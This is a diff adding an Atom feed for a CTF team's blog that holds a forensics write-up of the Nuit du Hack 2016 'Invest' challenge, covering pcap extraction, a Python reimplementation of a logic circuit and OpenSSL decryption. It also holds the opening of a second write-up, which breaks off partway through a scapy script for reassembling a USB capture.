@@ -1,0 +1,744 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+	<title>duks CTF team blog</title>
+	<link href="http://duksctf.github.io/blog/atom.xml" rel="self"/>
+	<link href="http://duksctf.github.io/blog"/>
+	<updated>2016-04-06T10:54:10+02:00</updated>
+	<id>http://duksctf.github.io/blog</id>
+	<author>
+		<name>duks CTF team</name>
+		<email>redacted</email>
+	</author>
+
+	
+		<entry>
+			<title>Nuit du hack quals 2016 - Invest</title>
+			<link href="http://duksctf.github.io/blog/2016/04/04/NDH2016-invest"/>
+			<updated>2016-04-04T00:00:00+02:00</updated>
+			<id>http://duksctf.github.io//blog/2016/04/04/NDH2016-invest</id>
+			<content type="html">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
+&lt;p&gt;Category : Inforensic&lt;/p&gt;
+
+&lt;p&gt;Points : 50&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;A paranoid guy seems to have secured his file very well. But I am convinced he made a mistake somewhere.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;The challenge provided us with &lt;a href=&quot;/resources/2016/ndh/invest/invest.pcapng&quot;&gt;invest.pcapng&lt;/a&gt;, a packet capture for us to analyze. With Wireshark we could extract several files with &lt;em&gt;File-&amp;gt;Export Objects-&amp;gt;HTML&lt;/em&gt;. Within the pcap is a file called ‘key.txt’, which contains a binary chain. Interpreting the chain in ASCII showed that it does not look really random:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;G^cnI9^GG9G9G9G9^cnInI95^c95nInIG^95nI^cG^95^c^c^cG^^cnIG^95G^nI^c^cnI^c^c95G^^c^c^cG^G^^cnInI^c&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The pcap also contains several pictures; one in particular seems interesting:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/resources/2016/ndh/invest/12767348_10208095326368148_1014857467_n.jpeg&quot; alt=&quot;schematics&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We noticed that this function takes 8 bit as input and output one bit. Among the downloaded they were 81 files with their name starting by &lt;em&gt;encrypt&lt;/em&gt;. They are base64 encoded. We merged, decoded them and obtained a file which start with the string &lt;code class=&quot;highlighter-rouge&quot;&gt;Salted__&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; binwalk merged.bin 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             OpenSSL encryption, salted, salt: 0x7DD883F026435AB8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;It means it is a file encrypted with OpenSSL. Then we coded the function represented by the previous picture:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;010001110101111001100011011011100100100100111001010111100100011101000111001110010100011100111001010001110011100101000111001110010101111001100011011011100100100101101110010010010011100100110101010111100110001100111001001101010110111001001001011011100100100101000111010111100011100100110101011011100100100101011110011000110100011101011110001110010011010101011110011000110101111001100011010111100110001101000111010111100101111001100011011011100100100101000111010111100011100100110101010001110101111001101110010010010101111001100011010111100110001101101110010010010101111001100011010111100110001100111001001101010100011101011110010111100110001101011110011000110101111001100011010001110101111001000111010111100101111001100011011011100100100101101110010010010101111001100011&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;chunks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunkSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunkSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunkSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# The logic part&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;b0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;b1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;b2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;b3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;b4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;b5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;b6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;b7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b1&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b6&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;d1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;d2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;d3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;d4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;d5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c5&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b2&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;e1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;e2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;e3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d3&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;e4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d4&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c4&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e2&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;f2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e3&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e4&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d5&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We passed the string contains in &lt;em&gt;key.txt&lt;/em&gt; to the script and we obtained the string “4Ukz95F2YqPi”. The string is 12-byte long. We did not know any cipher using such length for the key so we thought about a password. Since the guy is paranoid he would have used a strong block cipher. We started with AES-128:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl enc -aes128 -in merged.bin -out merged.out -d  -k 4Ukz95F2YqPi -p
+salt=7DD883F026435AB8
+key=215350CECF73E345AF6894267B335AA0
+iv =7413F91D4B87534B953CC656476C3107
+bad decrypt
+140385251583632:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:evp_enc.c:529:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Then we tried AES-256:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl enc -aes256 -in merged.bin -out merged.out -d  -k 4Ukz95F2YqPi -p
+salt=7DD883F026435AB8
+key=215350CECF73E345AF6894267B335AA07413F91D4B87534B953CC656476C3107
+iv =C2E8D310CAD4C7A8CC4CD67BA81E672F
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The file was decrypted properly. The decrypted file is a &lt;a href=&quot;/resources/2016/ndh/invest/merged.doc&quot;&gt;Word file&lt;/a&gt; which shows a picture. We unzip the file a run a grep on the repository:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep &quot;NDH&quot; -r merged.out_FILES/
+NDH[59rRS57bd5WH8RxgPbRS27q89a5bWrjL]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;It revealed the flag. However we could have open the file and move or delete the image to display the flag.&lt;/p&gt;
+</content>
+		</entry>
+	
+		<entry>
+			<title>Nuit du hack quals 2016 - Catch me if you can</title>
+			<link href="http://duksctf.github.io/blog/2016/04/04/NDH2016-catch-me-if-you-can"/>
+			<updated>2016-04-04T00:00:00+02:00</updated>
+			<id>http://duksctf.github.io//blog/2016/04/04/NDH2016-catch-me-if-you-can</id>
+			<content type="html">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We managed to infect the computer of a target. We recorded all packets&lt;br /&gt;
+transferred over the USB port, but there is something unusual. We need them to&lt;br /&gt;
+be sorted to get the juicy secret.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;details&quot;&gt;Details&lt;/h2&gt;
+
+&lt;p&gt;Points:         &lt;strong&gt;100&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Category:       &lt;strong&gt;forensic&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Validations:    &lt;strong&gt;50&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;We were given a file called &lt;a href=&quot;/resources/2016/ndh/catch_me_if_you_can/usb.pcap&quot;&gt;usb.pcap&lt;/a&gt;.&lt;br /&gt;
+After digging around the file for a while it appears that it’s a USB transfer of&lt;br /&gt;
+several files.&lt;/p&gt;
+
+&lt;p&gt;We wrote a simple &lt;a href=&quot;/resources/2016/ndh/catch_me_if_you_can/extract_files.py&quot;&gt;python script&lt;/a&gt; to extract the different blob with &lt;a href=&quot;http://www.secdev.org/projects/scapy/&quot;&gt;scapy&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python2&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pcap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdpcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;usb.pcap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;enumerate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;After analyzing those files, we found that there is &lt;strong&gt;two&lt;/strong&gt; files in the transfer.&lt;br /&gt;
+To reconstruct the two files, we simply use odd and even files for each. Here is&lt;br /&gt;
+the &lt;a href=&quot;/resources/2016/ndh/catch_me_if_you_can/prepare_file.py&quot;&gt;python script&lt;/a&gt; to do it:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt; &lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python2&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os.path&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;working_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;working&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;files1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;files2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;working_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
